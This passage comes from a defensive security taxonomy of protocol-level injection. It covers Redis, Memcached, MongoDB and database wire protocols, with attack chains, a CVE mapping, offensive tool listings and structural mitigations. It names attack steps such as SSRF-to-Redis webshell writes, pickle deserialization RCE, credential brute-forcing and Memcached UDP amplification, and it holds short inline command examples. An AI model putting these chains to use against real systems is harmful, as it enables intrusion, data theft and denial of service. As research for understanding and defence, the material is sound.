| **PHP unserialize via Redis/Memcached** | PHP applications using `serialize()`/`unserialize()` for session data stored in Redis or Memcached. Protocol injection writes a crafted PHP serialized object containing property-oriented programming (POP) gadget chains | PHP session handler using Redis/Memcached; known POP gadget chain in application or framework |
| **Ruby Marshal via Redis** | Ruby on Rails applications using Redis as a session store with Marshal serialization. Command injection writes a malicious Marshal payload that triggers code execution on deserialization (Orange Tsai's GitHub Enterprise attack chain) | Rails + Redis session store + Marshal serialization; protocol injection primitive |
| **Java deserialization via Redis** | Java applications storing serialized objects in Redis (e.g., Spring Session with Redis). Injected objects trigger gadget chains (Commons Collections, etc.) on deserialization | Java application + Redis + Java serialization; known gadget chain in classpath |

### §5-3. Protocol-Level Information Disclosure

Protocol-level bugs can leak sensitive data from server memory, connection state, or configuration without requiring authenticated access.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **MongoDB heap memory disclosure (MongoBleed)** | As detailed in §2-2: exploiting OP_COMPRESSED uncompressedSize mismatch to read uninitialized heap memory containing credentials, API keys, session tokens, and PII (CVE-2025-14847, CVSS 7.5/8.7, public PoC; Akamai and Qualys report CISA KEV listing and active exploitation) | MongoDB with compression negotiated; unauthenticated network access |
| **Redis DEBUG OBJECT information leak** | `DEBUG OBJECT key` reveals internal encoding, refcount, serialization size, and LRU information. Combined with `KEYS *` or `SCAN`, this provides a complete inventory of the data store's contents and metadata | Redis without ACL restricting DEBUG commands |
| **Redis CLIENT LIST connection information** | `CLIENT LIST` reveals all connected clients' IP addresses, ports, connection names, and currently executing commands — enabling reconnaissance of the application's internal architecture | Redis without ACL restricting CLIENT commands |
| **Memcached stats information disclosure** | Memcached's `stats`, `stats items`, `stats cachedump` commands reveal key names, sizes, and access patterns. `stats` itself reveals version, uptime, connection count, and memory usage | Memcached without authentication (default configuration) |
| **Protocol error message information leakage** | Error responses from Redis (`-ERR`), Memcached (`ERROR`, `CLIENT_ERROR`), and other services can reveal version information, configuration details, and internal state. Deliberately triggering errors through malformed commands is an enumeration technique | Any reachable service protocol; no authentication required for error triggering |

### §5-4. Protocol Amplification & Reflection

Service protocols can be weaponized for network amplification attacks by exploiting the asymmetry between small requests and large responses, or by using protocol commands that redirect responses to third-party targets.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Memcached UDP amplification** | Memcached's UDP protocol sends responses without verifying the source IP. A small `stats` request (15 bytes) can generate responses exceeding 100KB, achieving amplification ratios of 10,000–51,000x. This powered the largest-ever DDoS attacks in 2018 (1.35 Tbps against GitHub) | Memcached with UDP enabled (port 11211); spoofable source IP |
| **Redis SUBSCRIBE/PSUBSCRIBE amplification** | `SUBSCRIBE channel` creates a persistent connection that receives all messages published to the channel. An attacker subscribing to wildcard patterns (`PSUBSCRIBE *`) receives all pub/sub traffic in the Redis instance | Redis without ACL; pub/sub used for inter-service communication |
| **DNS amplification via protocol injection** | When protocol injection enables DNS lookup commands (e.g., Redis `DEBUG SLEEP` with strace showing DNS resolution, or application-level DNS lookups triggered by injected cache values), the DNS resolution can be directed to attacker-controlled authoritative servers for data exfiltration | Protocol injection with DNS resolution side-effect; external DNS reachable |

---

## §6. Connection Initialization & Authentication Protocol Attacks

The connection establishment and authentication phases of service protocols present unique injection surfaces — connection string parameter injection, authentication handshake manipulation, and credential extraction through protocol-level interactions.

### §6-1. Connection String Parameter Pollution

Application configurations that construct service connection strings from partially user-controlled data (environment variables, configuration files, URL parameters) are vulnerable to parameter injection that changes the connection's behavior.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Redis URL parameter injection** | Redis connection URLs (`redis://host:port/db?param=value`) accept parameters that modify client behavior. Injecting additional parameters via URL parsing manipulation can change the target database, enable/disable TLS, or modify authentication credentials | Application constructing Redis URLs from partially user-controlled input |
| **Memcached server list injection** | Connection strings listing multiple Memcached servers can be manipulated to add attacker-controlled servers. The client distributes keys across all servers, sending a portion of cache operations (including sensitive session data) to the attacker's server | Application constructing Memcached server lists from configurable input |
| **MongoDB connection string injection** | MongoDB connection URIs accept numerous parameters (`authMechanism`, `tlsAllowInvalidCertificates`, `replicaSet`). Injecting parameters can downgrade authentication, disable TLS certificate validation, or redirect the client to join a malicious replica set | Application constructing MongoDB URIs from partially user-controlled input |
| **JDBC URL parameter injection** | As covered extensively in `jdbc-attack.md` §10: JDBC URLs accept driver-specific parameters that enable deserialization (`autoDeserialize`), file read (`loggerFile`), class instantiation (`socketFactory`), and JNDI injection (`clientRerouteServerListJNDIName`). This subsection cross-references rather than duplicates that coverage | (→ cross-ref `jdbc-attack.md` §1–§10 for complete JDBC attack surface) |

### §6-2. Authentication Handshake Exploitation

Service protocol authentication mechanisms can be exploited through timing attacks, credential sniffing, or handshake manipulation.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Redis AUTH command timing** | Redis AUTH uses simple string comparison. Pre-6.0 Redis has no brute-force protection (no lockout, no delay). Combined with inline command injection, an attacker can inject `AUTH password_guess\r\n` commands to brute-force credentials | Redis with password authentication; protocol injection primitive |
| **Memcached SASL downgrade** | Memcached supports SASL authentication as an optional feature. If the client doesn't enforce SASL and the attacker can MITM or inject during connection setup, authentication can be skipped entirely | Memcached with optional SASL; network-level injection |
| **MongoDB SCRAM-SHA-1/256 downgrade** | MongoDB supports multiple authentication mechanisms. If the client allows mechanism negotiation, an attacker in a MITM position could downgrade from SCRAM-SHA-256 to the weaker SCRAM-SHA-1 or even MONGODB-CR (deprecated, uses MD5) | MongoDB with multiple auth mechanisms; MITM position |
| **Redis ACL command injection bypass** | Redis 6.0+ ACLs restrict commands per user. However, if the protocol injection occurs through a connection authenticated as a privileged user (e.g., the application's own connection pool), the injected commands execute with the application's privileges, bypassing per-user ACL restrictions | Protocol injection through application's authenticated connection pool |

---

## §7. Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories | Chain Example |
|---|---|---|---|
| **Cache Poisoning → Session Hijack** | Web app + Memcached/Redis session store | §1-1/§1-2 + §5-1 + §5-2 | CRLF in session key → Memcached command injection → overwrite victim's session → pickle deserialization RCE |
| **Internal Service Pivot → RCE** | SSRF + internal Redis | §3-3/§3-4 + §1-1 + §1-1 (CONFIG) | SSRF via Gopher → Redis CRLF injection → CONFIG SET dir/dbfilename → webshell write |
| **Data Exfiltration / Heap Leak** | Exposed database port | §2-2 + §5-3 | Crafted OP_COMPRESSED → MongoDB heap memory leak → credentials/API keys/PII extraction (MongoBleed) |
| **Authentication Bypass** | Application with cache-based auth | §1-1/§1-2 + §5-1 | Protocol injection → overwrite auth cache entry → bypass credential validation |
| **Wire Protocol SQL Injection** | Application with PostgreSQL/MongoDB | §2-1 + §4-4 | Large parameter → pgx 32-bit overflow → injected Query message → arbitrary SQL (CVE-2024-27304) |
| **Browser-to-Internal-Service** | User browsing + exposed local services | §3-2 + §1-1 | Malicious webpage → DNS rebinding → fetch() to localhost:6379 → Redis command injection |
| **Deserialization RCE via Protocol** | Flask + Memcached + pickle | §1-2 + §4-2 + §5-2 | pylibmc CRLF → Memcached set → malicious pickle object → application loads session → __reduce__ → RCE |
| **DDoS Amplification** | Exposed Memcached UDP | §5-4 | Spoofed source IP → Memcached stats request → 51,000x amplified response to victim (1.35 Tbps) |
| **Supply Chain Cache Poisoning** | Shared caching layer | §1-1/§1-2 + §5-1 | Protocol injection into shared cache → poisoned library/package metadata → downstream consumers pull malicious data |

---

## CVE / Bounty Mapping (2019–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---|---|---|
| §2-1 (pgx message overflow) | CVE-2024-27304 (Go pgx/pgproto3) | **CVSS Critical.** Wire protocol message framing corruption → SQL injection at protocol level. DEF CON 32 presentation. |
| §2-1 (pgx simple protocol) | CVE-2024-27289 (Go pgx v4) | SQL injection via simple protocol parameter pattern. |
| §4-4 (PostgreSQL JDBC) | CVE-2024-1597 (PostgreSQL JDBC) | **CVSS 10.0.** preferQueryMode=SIMPLE SQL injection; affects Keycloak and hundreds of Java applications. |
| §2-1 + §4-4 (psql UTF-8) | CVE-2025-1094 (PostgreSQL psql) | **Actively exploited.** Chained in BeyondTrust breach affecting 17+ enterprise customers including US Treasury. |
| §2-2 (MongoDB compression) | CVE-2025-14847 (MongoDB, "MongoBleed") | **CVSS 7.5 (v3.1) / 8.7 (v4.0).** Unauthenticated heap memory disclosure; broad internet exposure reported by third-party sources. Public PoC. Akamai and Qualys report CISA KEV listing and active exploitation. |
| §2-3 (FastCGI overflow) | CVE-2025-23016 (libfcgi) | Integer overflow in parameter parsing → heap overflow → RCE on 32-bit systems. |
| §2-3 (PHP-CGI argument injection) | CVE-2024-4577 (PHP-CGI Windows) | **CVSS 9.8. Actively exploited.** PHP-CGI argument injection via Windows Best-Fit character mapping. Widespread exploitation in 2025. |
| §4-1 (Netty HTTP CRLF) | CVE-2025-67735 (Netty HttpRequestEncoder) | CRLF injection in URI → HTTP request smuggling or cross-protocol injection. |
| §4-3 (Netty SMTP CRLF) | CVE-2025-59419 (Netty SMTP codec) | SMTP command injection → email forgery passing SPF/DKIM checks from trusted IP. |
| §4-3 (Jakarta Mail SMTP) | CVE-2025-7962 (Jakarta Mail 2.0.2) | SMTP injection via UTF-8 encoded CR/LF → arbitrary email forging. |
| §4-1 (Refit header injection) | CVE-2024-51501 (Refit library) | CRLF injection in Header/Authorize attributes → request smuggling. |
| §4-3 (VMware vCenter SMTP) | CVE-2025-41250 (VMware vCenter) | SMTP header injection in scheduled task notification → BCC injection, subject alteration. |
| §5-2 (Memcached pickle injection) | CVE-2021-33026 (Flask-Session) | Pickle deserialization RCE via Memcached command injection through Flask-Session cookie. |
| §1-4 (LDAP protocol RCE) | CVE-2024-49112 (Windows LDAP) | **CVSS 9.8.** Unauthenticated RCE via crafted LDAP calls. |
| §1-4 (LDAP protocol DoS) | CVE-2024-49113 (Windows LDAP, "LDAPNightmare") | **CVSS 7.5.** Unauthenticated DoS via malformed LDAP response; public PoC. |
| §6-2 (LDAP NTLM auth bypass) | CVE-2025-54918 (Windows LDAP) | NTLM LDAP authentication bypass → privilege escalation. |
| §1-2 + §5-2 (Memcached + pickle) | CTF: Cyber Apocalypse 2024 "SerialFlow" | Educational: Flask-Session + Memcached CRLF → pickle RCE chain. |
| §3-2 (DNS rebinding → MCP) | CVE-2025-66416 (MCP Python SDK) | DNS rebinding to local MCP server → tool invocation → potential RCE. |
| §1-1 (Redis via GitHub Enterprise) | Orange Tsai's GitHub Enterprise chain | SSRF → CRLF injection in urllib → Redis → Ruby Marshal deserialization → RCE. Public bounty writeup. |
| §5-4 (Memcached UDP amplification) | 2018 GitHub DDoS (1.35 Tbps) | Largest DDoS attack at the time; Memcached UDP amplification factor 51,000x. |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **Gopherus** (Python, open-source) | §1-1, §1-2, §3-3 Redis/Memcached/MySQL/FastCGI | Generates Gopher payloads for protocol injection via SSRF; supports Redis CONFIG, Memcached set, MySQL query, FastCGI params |
| **redis-rogue-server** (Python) | §1-1 Redis replication | Implements malicious Redis master for SLAVEOF-based module loading RCE |
| **redis-cli** (Redis built-in) | §1-1, §5-3, §6-2 Redis protocol testing | Direct protocol interaction for testing command injection, authentication, and information disclosure |
| **memccat/memcstat** (libmemcached) | §1-2, §5-3 Memcached testing | Memcached client tools for testing protocol interaction, key enumeration, and stats disclosure |
| **SSRFmap** (Python, open-source) | §3-3, §3-4 Multi-protocol SSRF | Automated SSRF exploitation with protocol-specific payloads for Redis, Memcached, FastCGI, MySQL, SMTP |
| **MongoBleed scanner** (Python, GitHub) | §2-2, §5-3 MongoDB heap leak | Dedicated scanner for CVE-2025-14847; tests OP_COMPRESSED exploitation for heap memory disclosure |
| **Nuclei** (Go, ProjectDiscovery) | §1-1, §1-2, §2-3, §6-1 Multi-protocol | YAML template scanner with Redis, Memcached, FastCGI, and MongoDB protocol injection templates |
| **sqlmap** (Python, open-source) | §2-1, §4-4 Database wire protocol | SQL injection tool that can detect and exploit protocol-level injection paths (PostgreSQL JDBC, preferQueryMode) |
| **Singularity** (Go, NCC Group) | §3-2 DNS rebinding | DNS rebinding attack framework for testing browser-to-internal-service protocol injection |
| **libfuzzer / AFL++** (C/C++) | §2-1, §2-2, §2-3 Binary protocol parsing | Coverage-guided fuzzing of protocol parser implementations (FastCGI, RESP, MongoDB wire protocol) |
| **Burp Suite** (Java, PortSwigger) | §4-1, §4-2, §6-1 HTTP-mediated injection | HTTP proxy with CRLF injection detection; Collaborator for out-of-band verification of protocol injection |
| **crackmapexec** (Python) | §1-4, §6-2 Multi-service auth | Multi-protocol authentication testing and enumeration for Redis, LDAP, and other services |

---

## Summary: Core Principles

### Why Protocol-Level Injection Persists

Protocol-level injection persists because of a fundamental **mismatch between the trust assumptions of service protocols and the reality of their deployment contexts**:

1. **Delimiter simplicity as an injection surface.** Text-based service protocols (Redis RESP, Memcached, FTP, SMTP) use CRLF as both a command terminator and a data delimiter. This simplicity — a feature for human-readable debugging and interoperability — becomes a vulnerability when untrusted data shares the same channel as commands. Unlike HTTP, which has evolved complex framing mechanisms (Content-Length, Transfer-Encoding, HTTP/2 frames) specifically to distinguish headers from body, service protocols rely on out-of-band guarantees (trusted networks, authenticated clients) that don't hold in modern cloud architectures where services are reachable via SSRF, shared networks, or client library bugs.

2. **Binary protocols trust their own framing.** Binary protocols (PostgreSQL wire protocol, MongoDB wire protocol, FastCGI) use length-prefixed messages that should be immune to delimiter injection. However, they trust the framing metadata (size fields, compression headers) provided by the sender. When a client library computes these fields with integer arithmetic that can overflow (32-bit size fields with >4GB payloads), or when a compression layer accepts declared sizes without validation (MongoBleed), the framing itself becomes the injection vector — and the consequences are severe because the protocol has no secondary validation mechanism.

3. **Tolerant parsing enables cross-protocol attacks.** Services designed for trusted environments parse input permissively — accepting what they can understand and discarding what they can't. Redis's line-by-line processing, Memcached's per-command error handling, and similar behaviors mean that a malformed request (HTTP POST to Redis, DNS rebinding payload) is not rejected wholesale. Instead, the valid commands embedded within the noise are extracted and executed. This tolerance, while user-friendly for debugging, transforms every protocol into a potential cross-protocol injection target.

### Why Incremental Fixes Fail

Each protocol injection class has seen a characteristic patch-bypass cycle:

- **Redis added POST/Host: → QUIT aliasing** (3.2.7) to block HTTP cross-protocol attacks — bypassed by using non-HTTP vectors (WebSocket, DNS rebinding, DICT scheme) or by crafting HTTP requests that don't start with POST/Host:
- **Python patched urllib CRLF** (CVE-2019-9740) — similar bugs recurred in Node.js, Go, Netty (CVE-2025-67735), and Refit (CVE-2024-51501) because each library independently implemented HTTP message construction
- **pgx added request size validation** for the wire protocol overflow — bypassable via WebSocket connections, HTTP compression, and alternative endpoints
- **Memcached introduced SASL authentication** — optional, rarely deployed, and doesn't protect against injection through authenticated application connections

The pattern is consistent: **defenses applied at the protocol boundary are circumvented by finding new paths to the boundary** (new client libraries, new delivery mechanisms, new protocol features).

### What Structural Solutions Look Like

Effective defenses share a common architecture: **separating the command channel from the data channel**:

- **RESP3 binary-safe protocol**: Redis's RESP3 protocol uses length-prefixed binary strings for all data, eliminating inline command parsing. Applications using RESP3 exclusively are immune to CRLF-based command injection — but only if client libraries consistently use RESP3 and never fall back to inline mode
- **Prepared statements at the protocol level**: PostgreSQL's extended query protocol separates SQL from parameters in distinct protocol messages. The DEF CON 32 research demonstrates that drivers using the simple query protocol (which mixes SQL and parameters in a single message) reintroduce injection — the structural fix is protocol-enforced separation
- **Authentication + ACL as defense-in-depth**: Redis 6.0+ ACLs restrict which commands each user can execute. Even when injection occurs through the application's connection, ACLs can prevent dangerous commands (CONFIG, MODULE, DEBUG, SLAVEOF) — reducing the blast radius from RCE to data manipulation
- **Network isolation**: The most effective defense against cross-protocol attacks is ensuring that service protocols are never reachable from untrusted contexts — no binding to 0.0.0.0, no exposure to SSRF-reachable networks, no reliance on application-level filtering. Unix domain sockets eliminate the TCP attack surface entirely
- **Client library hardening**: Systematic CRLF validation at the protocol message construction layer (not at the application input layer) prevents injection regardless of the delivery mechanism. The Netty CVE-2025-67735 fix (adding `HttpUtil.validateRequestLineTokens`) is a model for this approach

The fundamental tension is that protocol simplicity enables injection: Redis's inline command mode exists for debugging convenience, Memcached's text protocol exists for human readability, and binary protocols trust client-computed framing for performance. Structural solutions require sacrificing this simplicity — enforcing binary framing, mandatory authentication, and strict input validation at every protocol boundary.

---

## References

- [Paul Gerste (SonarSource): "SQL Injection Isn't Dead: Smuggling Queries at the Protocol Level" — DEF CON 32, 2024](https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn't%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf)
- [Ivan Novikov: "The New Page of Injections Book: Memcached Injections" — Black Hat USA 2014](https://blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf)
- [Akamai: "CVE-2025-14847: All You Need to Know About MongoBleed"](https://www.akamai.com/blog/security-research/cve-2025-14847-all-you-need-to-know-about-mongobleed)
- [Wiz: "MongoBleed: Critical MongoDB Vulnerability CVE-2025-14847"](https://www.wiz.io/blog/mongobleed-cve-2025-14847-exploited-in-the-wild-mongodb)
- [Unit42: "Threat Brief: MongoDB Vulnerability (CVE-2025-14847)"](https://unit42.paloaltonetworks.com/mongobleed-cve-2025-14847/)
- [OX Security: "PoC: Exploiting MongoBleed, CVE-2025-14847 Technical Walkthrough"](https://www.ox.security/blog/poc-exploiting-mongobleed-cve-2025-14847-technical-walkthrough/)
- [Synacktiv: "CVE-2025-23016: Exploiting the FastCGI library"](https://www.synacktiv.com/en/publications/cve-2025-23016-exploiting-the-fastcgi-library)
- [Rapid7: "CVE-2025-1094: PostgreSQL psql SQL injection"](https://www.rapid7.com/blog/post/2025/02/13/cve-2025-1094-postgresql-psql-sql-injection-fixed/)
- [OX Security: "Lessons from the PostgreSQL CVE-2025-1094 Exploitation"](https://www.ox.security/blog/lessons-from-the-postgresql-cve-2025-1094-exploitation/)
- [Wiz: "Redis RCE CVE-2025-49844"](https://www.wiz.io/blog/wiz-research-redis-rce-cve-2025-49844)
- [Sysdig: "Understanding CVE-2025-49844: RediShell"](https://www.sysdig.com/blog/cve-2025-49844-redishell)
- [DEVCORE: "Security Alert: CVE-2024-4577 - PHP CGI Argument Injection Vulnerability"](https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/)
- [Netty Security Advisory: "CVE-2025-67735: CRLF injection in HttpRequestEncoder"](https://github.com/netty/netty/security/advisories/GHSA-84h7-rjj3-6jx4)
- [Netty Security Advisory: "CVE-2025-59419: SMTP Command Injection"](https://github.com/netty/netty/security/advisories/GHSA-jq43-27x9-3v86)
- [CrowdStrike: "Analyzing NTLM LDAP Auth Bypass Vulnerability (CVE-2025-54918)"](https://www.crowdstrike.com/en-us/blog/analyzing-ntlm-ldap-authentication-bypass-vulnerability/)
- [SafeBreach: "LDAPNightmare: CVE-2024-49113 PoC"](https://www.safebreach.com/blog/ldapnightmare-safebreach-labs-publishes-first-proof-of-concept-exploit-for-cve-2024-49113/)
- [D4D Blog: "Memcached Command Injections at Pylibmc"](https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/)
- [Orange Tsai: "How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!"](https://blog.orange.tw/posts/2017-07-how-i-chained-4-vulnerabilities-on/)
- [Redis: "Cross Protocol Scripting protection"](https://github.com/redis/redis/commit/874804da0c014a7d704b3d285aa500098a931f50)
- [Redis: "Serialization protocol specification (RESP)"](https://redis.io/docs/latest/develop/reference/protocol-spec/)
- [Straiker AI: "Agentic Danger: DNS Rebinding Exposes Internal MCP Servers"](https://www.straiker.ai/blog/agentic-danger-dns-rebinding-exposing-your-internal-mcp-servers)
- [NCC Group: "Singularity: DNS Rebinding Attack Framework"](https://github.com/nccgroup/singularity)
- [HackTricks: "6379 - Pentesting Redis"](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis)
- [HackTricks: "11211 - Pentesting Memcache"](https://book.hacktricks.wiki/en/network-services-pentesting/11211-memcache)
- [PortSwigger: "Top 10 Web Hacking Techniques of 2024"](https://portswigger.net/research/top-10-web-hacking-techniques-of-2024)
- [Snyk: "CVE-2024-1597: SQL Injection in org.postgresql:postgresql"](https://security.snyk.io/vuln/SNYK-JAVA-ORGPOSTGRESQL-6252740)
- [Simon Willison: "SQL Injection Isn't Dead: Smuggling Queries at the Protocol Level"](https://simonwillison.net/2024/Aug/12/smuggling-queries-at-the-protocol-level/)
- [su18: "JDBC Connection URL Attack"](https://su18.org/post/jdbc-connection-url-attack/)
- [Code Intelligence: "New Vulnerability in MySQL JDBC Driver: RCE and Unauthorized DB Access"](https://www.code-intelligence.com/blog/cve-jdbc-mysql-driver-rce-unauthorized-read-write-access)
- SonarSource: "Zimbra Email — Stealing Clear-Text Credentials via Memcache injection" (2022) — Memcache CRLF injection in Zimbra enabling credential theft
- Doyhenard: "Exploiting Inter-Process Communication in SAP's HTTP Server" (Black Hat USA 2022) — SAP ICM shared memory IPC exploitation

---

*This document was created for defensive security research and vulnerability understanding purposes.*
